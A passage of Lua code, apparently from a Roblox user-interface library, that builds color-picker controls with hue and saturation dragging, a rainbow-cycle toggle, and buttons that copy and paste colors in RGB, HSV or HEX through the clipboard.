									ColorSequenceKeypoint.new(0.00, C.COL3RGB(255, 0, 0)), 
									ColorSequenceKeypoint.new(0.17, C.COL3RGB(255, 0, 255)), 
									ColorSequenceKeypoint.new(0.33, C.COL3RGB(0, 0, 255)), 
									ColorSequenceKeypoint.new(0.50, C.COL3RGB(0, 255, 255)), 
									ColorSequenceKeypoint.new(0.67, C.COL3RGB(0, 255, 0)), 
									ColorSequenceKeypoint.new(0.83, C.COL3RGB(255, 255, 0)), 
									ColorSequenceKeypoint.new(1.00, C.COL3RGB(255, 0, 0)) 
								}

								Huedrag.Name = "Huedrag" 
								Huedrag.Parent = Huepick 
								Huedrag.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Huedrag.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Huedrag.Size = C.UDIM2(1, 0, 0, 2) 
								Huedrag.ZIndex = 4

								ColorP.MouseButton1Down:Connect(function() 
									Frame.Visible = not Frame.Visible 
								end) 
								local abc = false 
								local inCP = false 
								ColorP.MouseEnter:Connect(function() 
									abc = true 
								end) 
								ColorP.MouseLeave:Connect(function() 
									abc = false 
								end) 
								Frame.MouseEnter:Connect(function() 
									inCP = true 
								end) 
								Frame.MouseLeave:Connect(function() 
									inCP = false 
								end) 

								ColorH = (C.CLAMP(Huedrag.AbsolutePosition.Y-Huepick.AbsolutePosition.Y, 0, Huepick.AbsoluteSize.Y)/Huepick.AbsoluteSize.Y) 
								ColorS = 1-(C.CLAMP(ColorDrag.AbsolutePosition.X-Colorpick.AbsolutePosition.X, 0, Colorpick.AbsoluteSize.X)/Colorpick.AbsoluteSize.X) 
								ColorV = 1-(C.CLAMP(ColorDrag.AbsolutePosition.Y-Colorpick.AbsolutePosition.Y, 0, Colorpick.AbsoluteSize.Y)/Colorpick.AbsoluteSize.Y) 

								if data.default and data.default.Color ~= nil then 
									Element.value.Color = data.default.Color
									ColorH, ColorS, ColorV = data.default.Color:ToHSV() 

									ColorH = C.CLAMP(ColorH,0,1) 
									ColorS = C.CLAMP(ColorS,0,1) 
									ColorV = C.CLAMP(ColorV,0,1) 
									ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
									Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

									ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
									Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
									
									
									values[tabname][sectorname][text] = data.default.Color 
									--print(data.default.Color,Element.value.Color,text)
								elseif Element.value.Color ~= nil then
									ColorH, ColorS, ColorV = Element.value.Color:ToHSV() 

									ColorH = C.CLAMP(ColorH,0,1) 
									ColorS = C.CLAMP(ColorS,0,1) 
									ColorV = C.CLAMP(ColorV,0,1) 
									ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
									Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

									ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
									Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 

									values[tabname][sectorname][text] = Element.value.Color 
								end
								

								local mouse = LocalPlayer:GetMouse() 
								game:GetService("UserInputService").InputBegan:Connect(function(input) 
									if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
										if not dragging and not abc and not inCP then 
											Frame.Visible = false 
										end 
									end 
								end) 

								local function updateColor() 
									local ColorX = (C.CLAMP(mouse.X - Colorpick.AbsolutePosition.X, 0, Colorpick.AbsoluteSize.X)/Colorpick.AbsoluteSize.X) 
									local ColorY = (C.CLAMP(mouse.Y - Colorpick.AbsolutePosition.Y, 0, Colorpick.AbsoluteSize.Y)/Colorpick.AbsoluteSize.Y) 
									ColorDrag.Position = C.UDIM2(ColorX, 0, ColorY, 0) 
									ColorS = 1-ColorX 
									ColorV = 1-ColorY 
									Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
									ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
									values[tabname][sectorname][text] = Element.value 
									Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
									callback(Element.value) 
								end 
								local function updateHue() 
									local y = C.CLAMP(mouse.Y - Huepick.AbsolutePosition.Y, 0, 148) 
									Huedrag.Position = C.UDIM2(0, 0, 0, y) 
									hue = y/148 
									ColorH = 1-hue 
									Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
									ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
									values[tabname][sectorname][text] = Element.value 
									Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
									callback(Element.value) 
								end 
								Colorpick.MouseButton1Down:Connect(function() 
									updateColor() 
									moveconnection = mouse.Move:Connect(function() 
										updateColor() 
									end) 
									releaseconnection = game:GetService("UserInputService").InputEnded:Connect(function(Mouse) 
										if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
											updateColor() 
											moveconnection:Disconnect() 
											releaseconnection:Disconnect() 
										end 
									end) 
								end) 
								Huepick.MouseButton1Down:Connect(function() 
									updateHue() 
									moveconnection = mouse.Move:Connect(function() 
										updateHue() 
									end) 
									releaseconnection = game:GetService("UserInputService").InputEnded:Connect(function(Mouse) 
										if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
											updateHue() 
											moveconnection:Disconnect() 
											releaseconnection:Disconnect() 
										end 
									end) 
								end) 

								Button.MouseButton1Down:Connect(function() 
									Element.value.Toggle = not Element.value.Toggle 
									update() 
									values[tabname][sectorname][text] = Element.value 
									callback(Element.value) 
								end) 
								if data.default then 
									update() 
								end 
								--print(data.default.Color ~= nil and deta.default.Color or ' ',Element.value.Color,text)

								values[tabname][sectorname][text] = Element.value 
								--print(Element.value.Color,text)
								if data.default and data.default.Color ~= nil then
												Element.value.Color = data.default.Color
												ColorH, ColorS, ColorV = Element.value.Color:ToHSV() 

												ColorH = C.CLAMP(ColorH,0,1) 
												ColorS = C.CLAMP(ColorS,0,1) 
												ColorV = C.CLAMP(ColorV,0,1) 
												ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
												Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

												ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
												Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
												values[tabname][sectorname][text] = Element.value 
												Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
												callback(Element.value) 								
								end
								function Element:SetValue(value) 
									Element.value = value 
									local duplicate = C.COL3(value.Color.R, value.Color.G, value.Color.B) 
									ColorH, ColorS, ColorV = duplicate:ToHSV() 
									ColorH = C.CLAMP(ColorH,0,1) 
									ColorS = C.CLAMP(ColorS,0,1) 
									ColorV = C.CLAMP(ColorV,0,1) 

									ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
									Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
									ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
									update() 
									update123()
									Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 

									callback(value) 
								end
							elseif type == "ToggleTrans" then 
								Section.Size = Section.Size + C.UDIM2(0,0,0,16) 
								Element.value = {Rainbow = false, RainbowSpeed = 3,Toggle = data.default and data.default.Toggle or false, Color = data.default and data.default.Color or C.COL3RGB(255,255,255), Transparency = data.default and data.default.Transparency or 0} 

								local Toggle = C.INST("Frame") 
								local Button = C.INST("TextButton") 
								local Color = C.INST("Frame") 
								local TextLabel = C.INST("TextLabel") 

								Toggle.Name = "Toggle" 
								Toggle.Parent = Inner 
								Toggle.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Toggle.BackgroundTransparency = 1.000 
								Toggle.Size = C.UDIM2(1, 0, 0, 15) 

								Button.Name = "Button" 
								Button.Parent = Toggle 
								Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button.BackgroundTransparency = 1.000 
								Button.Size = C.UDIM2(1, 0, 1, 0) 
								Button.Font = Enum.Font.SourceSans 
								Button.Text = "" 
								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button.TextSize = 11.000

								Color.Name = "Color" 
								Color.Parent = Button 
								Color.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Color.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Color.Position = C.UDIM2(0, 15, 0.5, -5) 
								Color.Size = C.UDIM2(0, 8, 0, 8) 

								TextLabel.Parent = Button 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.Position = C.UDIM2(0, 32, 0, -1) 
								TextLabel.Size = C.UDIM2(0.111913361, 208, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = text 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

								local function update() 
									if Element.value.Toggle then 
										tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = MainUIColor}) 
										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
									else 
										tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
									end 
									values[tabname][sectorname][text] = Element.value 
									callback(Element.value) 
								end 

								local ColorH,ColorS,ColorV 

								local ColorP = C.INST("TextButton") 
								local Frame = C.INST("Frame") 
								local Colorpick = C.INST("ImageButton") 
								local ColorDrag = C.INST("Frame") 
								local Huepick = C.INST("ImageButton") 
								local Huedrag = C.INST("Frame") 

								ColorP.Name = "ColorP" 
								ColorP.Parent = Button 
								ColorP.AnchorPoint = C.Vec2(1, 0) 
								ColorP.BackgroundColor3 = C.COL3RGB(255, 0, 0) 
								ColorP.BorderColor3 = C.COL3RGB(18, 18, 16) 
								ColorP.Position = C.UDIM2(0, 270, 0.5, -4) 
								ColorP.Size = C.UDIM2(0, 18, 0, 8) 
								ColorP.AutoButtonColor = false 
								ColorP.Font = Enum.Font.Gotham 
								ColorP.Text = "" 
								ColorP.TextColor3 = C.COL3RGB(200, 200, 200) 
								ColorP.TextSize = 11.000

								Frame.Parent = ColorP 
								Frame.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Frame.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Frame.Position = C.UDIM2(-0.666666687, -170, 1.375, 0) 
								Frame.Size = C.UDIM2(0, 200, 0, 300) --edit here
								Frame.Visible = false 
								Frame.ZIndex = 3 

								local Button5 = C.INST("Frame") 
								local Button_25 = C.INST("TextButton") 
								local TextLabel5 = C.INST("TextLabel") 

								Button5.Name = "Button" 
								Button5.Parent = Frame 
								Button5.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button5.BackgroundTransparency = 1.000 
								Button5.Position = C.UDIM2(0, -20, 0, 190) --edit here
								Button5.Size = C.UDIM2(1, 0, 0, 15) 
								Button5.ZIndex = 3

								Button_25.Name = "Button" 
								Button_25.Parent = Button5
								Button_25.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button_25.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button_25.Position = C.UDIM2(0, 30, 0.5, -9)
								Button_25.Size = C.UDIM2(0, 175, 0, 18) 
								Button_25.AutoButtonColor = false 
								Button_25.Font = Enum.Font.SourceSans 
								Button_25.Text = "" 
								Button_25.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button_25.TextSize = 11.000
								Button_25.ZIndex = 3

								TextLabel5.Parent = Button_25
								TextLabel5.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel5.BackgroundTransparency = 1.000 
								TextLabel5.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel5.Size = C.UDIM2(1, 0, 1, 0) 
								TextLabel5.Font = Enum.Font.Gotham 
								TextLabel5.Text = 'Copy colors' 
								TextLabel5.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel5.TextSize = 11.000
								TextLabel5.ZIndex = 3

							CopyColorsType = 'RGB'
								Button_25.MouseButton1Down:Connect(function() 
									TextLabel5.TextColor3 = MainUIColor 
									library:Tween(TextLabel5, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
								local retarded, lmao = pcall(function()
								local l,m,a = C.FLOOR((Element.value.Color.R*255)+0.5),C.FLOOR((Element.value.Color.G*255)+0.5),C.FLOOR((Element.value.Color.B*255)+0.5)
									if CopyColorsType == 'RGB' then
										setclipboard(''..l..','..m..','..a) -- o
									elseif CopyColorsType == 'HEX' then
										setclipboard(C.COL3RGB(l,m,a):ToHex())
									elseif CopyColorsType == 'HSV' then 
										local H,S,V = C.COL3(l,m,a):ToHSV() --hsl, cmyk
										setclipboard(''..H..','..S..','..V)
										end
									end)
									if retarded then
									TextLabel5.Text = 'Success!'
									wait(1.5)
									TextLabel5.Text = 'Copy colors'
									else
										TextLabel5.Text = 'Error!'
										wait(1.5)
										TextLabel5.Text = 'Copy colors'
										print(lmao)
										print(Element.value.Color)
										print(Element.value.Color.value)
									end
								end) 
								Button_25.MouseEnter:Connect(function() 
									library:Tween(TextLabel5, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
								end) 
								Button_25.MouseLeave:Connect(function() 
									library:Tween(TextLabel5, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
								end) 

									do
									--Element.value = {Dropdown = data.options[1]} 

									local Dropdown = C.INST("Frame") 
									local Button = C.INST("TextButton") 
									local TextLabel = C.INST("TextLabel") 
									local Drop = C.INST("ScrollingFrame") 
									local Button_2 = C.INST("TextButton") 
									local TextLabel_2 = C.INST("TextLabel") 
									local UIListLayout = C.INST("UIListLayout") 
									local ImageLabel = C.INST("ImageLabel") 
									local TextLabel_3 = C.INST("TextLabel") 
									--Frame.Size = C.UDIM2(0,200,270)
									Dropdown.Name = "Dropdown" 
									Dropdown.Parent = Frame 
									Dropdown.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Dropdown.BackgroundTransparency = 1.000 
									Dropdown.Position = C.UDIM2(0, -20, 0, 208) 
									Dropdown.Size = C.UDIM2(1, 0, 0, 39) 
									Dropdown.ZIndex = 4

									Button.Name = "Button" 
									Button.Parent = Dropdown 
									Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Button.Position = C.UDIM2(0, 30, 0, 16) 
									Button.Size = C.UDIM2(0, 175, 0, 17) 
									Button.AutoButtonColor = false 
									Button.Font = Enum.Font.SourceSans 
									Button.Text = "" 
									Button.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button.TextSize = 11.000
									Button.ZIndex = 4

									TextLabel.Parent = Button 
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
									TextLabel.Position = C.UDIM2(0, 5, 0, 0) 
									TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = 'RGB'
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000
									TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
									TextLabel.ZIndex = 4

									local abcd = TextLabel 

									Drop.Name = "Drop" 
									Drop.Parent = Button 
									Drop.Active = true 
									Drop.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Drop.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Drop.Position = C.UDIM2(0, 0, 1, 1) 
									Drop.Size = C.UDIM2(1, 0, 0, 20) 
									Drop.Visible = false 
									Drop.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.CanvasSize = C.UDIM2(0, 0, 0, 0) 
									Drop.ScrollBarThickness = 4 
									Drop.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.AutomaticCanvasSize = "Y" 
									Drop.ZIndex = 5 
									Drop.ScrollBarImageColor3 = MainUIColor 

									UIListLayout.Parent = Drop 
									UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
									UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder --DROPDOWN COPY COLORS
									local table = {'RGB', 'HSV', 'HEX'}
									local num = #table 
									if num > 5 then 
										Drop.Size = C.UDIM2(1, 0, 0, 85) 
									else 
										Drop.Size = C.UDIM2(1, 0, 0, 17*num) 
									end 
									local first = true 
									for i,v in ipairs(table) do 
										do 
											local Button = C.INST("TextButton") 
											local TextLabel = C.INST("TextLabel") 

											Button.Name = v 
											Button.Parent = Drop 
											Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
											Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
											Button.Position = C.UDIM2(0, 30, 0, 16) 
											Button.Size = C.UDIM2(0, 175, 0, 17) 
											Button.AutoButtonColor = false 
											Button.Font = Enum.Font.SourceSans 
											Button.Text = "" 
											Button.TextColor3 = C.COL3RGB(0, 0, 0) 
											Button.TextSize = 11.000
											Button.BorderSizePixel = 0 
											Button.ZIndex = 6 

											TextLabel.Parent = Button 
											TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
											TextLabel.BackgroundTransparency = 1.000 
											TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
											TextLabel.Position = C.UDIM2(0, 5, 0, -1) 
											TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
											TextLabel.Font = Enum.Font.Gotham 
											TextLabel.Text = v 
											TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
											TextLabel.TextSize = 11.000
											TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
											TextLabel.ZIndex = 6 

											Button.MouseButton1Down:Connect(function() 
												Drop.Visible = false 
												--Element.value.Dropdown = v 
												CopyColorsType = v
												abcd.Text = v 
												--values[tabname][sectorname][text] = Element.value 
												--callback(Element.value) 
												Drop.CanvasPosition = C.Vec2(0,0) 
											end) 
											Button.MouseEnter:Connect(function() 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  MainUIColor}) 
											end) 
											Button.MouseLeave:Connect(function() 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  C.COL3RGB(200, 200, 200)}) 
											end) 

											first = false 
										end 
									end

									ImageLabel.Parent = Button 
									ImageLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									ImageLabel.BackgroundTransparency = 1.000 
									ImageLabel.Position = C.UDIM2(0, 165, 0, 6) 
									ImageLabel.Size = C.UDIM2(0, 6, 0, 4) 
									ImageLabel.Image = "http://www.roblox.com/asset/?id=6724771531" 
									ImageLabel.ZIndex = 4

									TextLabel_3.Parent = Dropdown 
									TextLabel_3.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel_3.BackgroundTransparency = 1.000 
									TextLabel_3.Position = C.UDIM2(0, 32, 0, -1) 
									TextLabel_3.Size = C.UDIM2(0.111913361, 208, 0.382215232, 0) 
									TextLabel_3.Font = Enum.Font.Gotham 
									TextLabel_3.Text = 'Copy colors type' 
									TextLabel_3.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel_3.TextSize = 11.000
									TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left 
									TextLabel_3.ZIndex = 4

									Button.MouseButton1Down:Connect(function() 
										Drop.Visible = not Drop.Visible 
										if not Drop.Visible then 
											Drop.CanvasPosition = C.Vec2(0,0) 
										end 
									end) 
									local indrop = false 
									local ind = false 
									Drop.MouseEnter:Connect(function() 
										indrop = true 
									end) 
									Drop.MouseLeave:Connect(function() 
										indrop = false 
									end) 
									Button.MouseEnter:Connect(function() 
										ind = true 
									end) 
									Button.MouseLeave:Connect(function() 
										ind = false 
									end) 
									game:GetService("UserInputService").InputBegan:Connect(function(input) 
										if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
											if Drop.Visible == true and not indrop and not ind then 
												Drop.Visible = false 
												Drop.CanvasPosition = C.Vec2(0,0) 
											end 
										end 
									end) 								
								end





								local Button35 = C.INST("Frame") 
								local Button_325 = C.INST("TextButton") 
								local TextLabel35 = C.INST("TextLabel") 

								Button35.Name = "Button" 
								Button35.Parent = Frame 
								Button35.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button35.BackgroundTransparency = 1.000 
								Button35.Position = C.UDIM2(0, -20, 0, 247) --edit here
								Button35.Size = C.UDIM2(1, 0, 0, 15) 
								Button35.ZIndex = 4

								Button_325.Name = "Button" 
								Button_325.Parent = Button35
								Button_325.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button_325.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button_325.Position = C.UDIM2(0, 30, 0.5, -9) 
								Button_325.Size = C.UDIM2(0, 175, 0, 18) 
								Button_325.AutoButtonColor = false 
								Button_325.Font = Enum.Font.SourceSans 
								Button_325.Text = "" 
								Button_325.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button_325.TextSize = 11.000
								Button_325.ZIndex = 4

								TextLabel35.Parent = Button_325
								TextLabel35.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel35.BackgroundTransparency = 1.000 
								TextLabel35.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel35.Size = C.UDIM2(1, 0, 1, 0) 
								TextLabel35.Font = Enum.Font.Gotham 
								TextLabel35.Text = 'Paste colors' 
								TextLabel35.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel35.TextSize = 11.000
								TextLabel35.ZIndex = 4

									

									
								Button_325.MouseButton1Down:Connect(function() 
									TextLabel35.TextColor3 = MainUIColor 
									library:Tween(TextLabel35, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
									local clipboard = getclipboard()
									local colors = string.split(clipboard, ',')
									local IsAColor = false
									local WhatKindOfColor = ''
									if pcall(function() return C.COL3HSV(clipboard:gsub('#','')) end) then
										IsAColor = true
										WhatKindOfColor = 'HEX'
									elseif #colors == 3 and (tonumber(colors[1]) and tonumber(colors[1]) <= 256 and tonumber(colors[1]) >= -1) and (tonumber(colors[2]) and tonumber(colors[2]) <= 256 and tonumber(colors[2]) >= -1) and (tonumber(colors[3]) and tonumber(colors[3]) <= 256 and tonumber(colors[3]) >= -1) then
										IsAColor = true
										WhatKindOfColor = 'RGB'
									end
									
									
									if IsAColor then
										local retarded, lmao = pcall(function()
											if WhatKindOfColor == 'RGB' then
												Element.value.Color = C.COL3RGB(colors[1],colors[2],colors[3])
											elseif WhatKindOfColor == 'HEX' then
												Element.value.Color = C.COL3HEX(clipboard:gsub('#',''))
											end
											ColorH, ColorS, ColorV = Element.value.Color:ToHSV() 

											ColorH = C.CLAMP(ColorH,0,1) 
											ColorS = C.CLAMP(ColorS,0,1) 
											ColorV = C.CLAMP(ColorV,0,1) 
											ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
											Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
											
											ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
											Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
											values[tabname][sectorname][text] = Element.value 
											Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
											callback(Element.value) 
										end)
											if retarded then
												TextLabel35.Text = 'Success!'
												wait(1.5)
												TextLabel35.Text = 'Paste colors'
											else
												TextLabel35.Text = 'Error!'
												wait(1.5)
												TextLabel35.Text = 'Paste colors'
												print(lmao)
											end
									else
										TextLabel35.Text = 'Not a color'
										wait(1.5)
										TextLabel35.Text = "Paste colors"
									end
								end)
								Button_325.MouseEnter:Connect(function() 
									library:Tween(TextLabel5, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
								end) 
								Button_325.MouseLeave:Connect(function() 
									library:Tween(TextLabel5, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
								end)
							
								
								
								
								
								-------------------------------------------------------------------

									local Toggle123 = C.INST("Frame") 
									local Button123 = C.INST("TextButton") 
									local Color123 = C.INST("Frame") 
									local TextLabel123 = C.INST("TextLabel") 							
									Toggle123.Name = "Toggle123" 
									Toggle123.Parent = Frame 
									Toggle123.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Toggle123.BackgroundTransparency = 1.000 
									Toggle123.Size = C.UDIM2(1, 0, 0, 15) 
									Toggle123.Position = C.UDIM2(0, -5, 0, 265) --edit here
									Toggle123.ZIndex = 4
									
									--print('it actually spawned')
									
									Button123.Name = "Button123" 
									Button123.Parent = Toggle123 
									Button123.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Button123.BackgroundTransparency = 1.000 
									Button123.Size = C.UDIM2(1, 0, 1, 0) 
									Button123.Font = Enum.Font.SourceSans 
									Button123.Text = "" 
									Button123.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button123.TextSize = 11.000
									Button123.ZIndex = 4

									Color123.Name = "Color123" 
									Color123.Parent = Button123
									
									Color123.BackgroundColor3 = MainUIColor 
									
									Color123.BackgroundColor3 = C.COL3RGB(46, 46, 46)
									Color123.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Color123.Position = C.UDIM2(0, 15, 0.5, -5) 
									Color123.Size = C.UDIM2(0, 8, 0, 8) 
									Color123.ZIndex = 4

									TextLabel123.Parent = Button123 
									TextLabel123.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel123.BackgroundTransparency = 1.000 
									TextLabel123.Position = C.UDIM2(0, 32, 0, -1) 
									TextLabel123.Size = C.UDIM2(0.111913361, 208, 1, 0) 
									TextLabel123.Font = Enum.Font.Gotham 
									TextLabel123.Text = "Rainbow" 
									TextLabel123.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel123.TextSize = 11.000
									TextLabel123.TextXAlignment = Enum.TextXAlignment.Left 
									TextLabel123.ZIndex = 4

									local function update123() 
										if Element.value.Rainbow then 
											tween123 = library:Tween(Color123, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = MainUIColor}) 
											library:Tween(TextLabel123, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
										else 
											--keybindremove(text, Element.value.Key) 
											tween123 = library:Tween(Color123, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
											library:Tween(TextLabel123, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
										--values[tabname][sectorname][tabtext][text] = Element.value 
									end
									
									Button123.MouseButton1Down:Connect(function() 
										Element.value.Rainbow = not Element.value.Rainbow
										update123() 
									end)
								
											game.RunService.RenderStepped:Connect(function()
												if Element.value.Rainbow then

														ColorH, ColorS, ColorV = tick() % Element.value.RainbowSpeed/Element.value.RainbowSpeed,1,1

														ColorH = C.CLAMP(ColorH,0,1) 
														ColorS = C.CLAMP(ColorS,0,1) 
														ColorV = C.CLAMP(ColorV,0,1)
																							
														ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
														Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

														ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
														Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
														values[tabname][sectorname][text] = Element.value 
														Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
														callback(Element.value)
																							
																							--library.options['armColor']:SetColor(Color3.fromHSV(i,1,1))
														wait()
																				--		library.options['Accent Color']:SetColor(Color3.fromHSV(i,1,1)) -- also u can change any flag that has color by prinitng flags (table.foreach(library.flags,print)

												end
											end)												
								local Slider2113132 = C.INST("Frame") 
								local TextLabel2113132 = C.INST("TextLabel") 
								local Button2113132 = C.INST("TextButton") 
								local Frame123123 = C.INST("Frame") 
								local UIGradient123123 = C.INST("UIGradient") 
								local Value123123123 = C.INST("TextLabel") 

								Slider2113132.Name = "Slider2113132" 
								Slider2113132.Parent = Frame 
								Slider2113132.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Slider2113132.BackgroundTransparency = 1.000 
								Slider2113132.Position = C.UDIM2(0, -15, 0, 277) --edit here
								Slider2113132.Size = C.UDIM2(1, 0, 0, 25) 
								Slider2113132.ZIndex = 3

								TextLabel2113132.Parent = Slider2113132 
								TextLabel2113132.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
